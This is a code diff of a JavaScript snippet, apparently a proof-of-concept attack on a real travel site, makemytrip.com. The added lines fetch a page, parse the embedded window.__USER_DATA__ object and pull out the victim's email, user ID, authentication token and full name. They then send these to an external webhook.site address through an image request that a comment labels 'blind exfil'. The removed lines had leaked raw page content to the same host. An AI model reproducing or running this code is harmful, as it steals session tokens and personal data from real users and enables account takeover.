@@ -5,9 +5,25 @@ fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zw
 })
 .then(res => res.text())
 .then(body => {
-  // send first 200 chars (encoded) via image src
-  const i = new Image();
-  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encodeURIComponent(body.slice(50, 400));
+  // extract the value of window.__USER_DATA__ using regex
+  const match = body.match(/window\.__USER_DATA__\s*=\s*(\[\{.+?\}\]);/);
+
+  if (match) {
+    const userData = JSON.parse(match[1])[0];
+
+    const email = userData.userDetails.extendedUser.primaryEmailId;
+    const uuid = userData.userDetails.extendedUser.uuid;
+    const auth = userData.authToken;
+    const name = userData.userDetails.extendedUser.personalDetails.name;
+    const fullName = `${name.firstName} ${name.lastName}`;
+
+    // blind exfil via GET to webhook
+    const img = new Image();
+    img.src = `https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?email=${encodeURIComponent(email)}&uuid=${uuid}&auth=${auth}&name=${encodeURIComponent(fullName)}`;
+  } else {
+    const i = new Image();
+    i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=NO_MATCH";
+  }
 })
 .catch(err => {
   const i = new Image();
